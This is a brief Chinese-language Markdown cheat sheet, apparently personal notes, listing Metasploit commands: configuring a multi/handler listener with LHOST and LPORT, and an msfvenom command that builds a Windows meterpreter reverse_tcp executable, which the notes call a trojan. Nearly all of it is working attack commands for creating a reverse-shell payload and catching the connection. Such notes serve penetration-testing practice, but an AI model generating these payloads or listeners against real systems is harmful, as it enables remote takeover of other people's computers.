## msfconsole
use multi/handler
set LHOST IP
set LPORT 端口
exploit
开始监听

## msfvenom
`-l payloads` 回显所有可生成的木马
`-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=端口 -f exe -o 路径` 可以在 msfconsole 中使用

<!--stackedit_data:
eyJoaXN0b3J5IjpbMTg4ODEwMTg4MSw3MzUxNjQ3NTJdfQ==
-->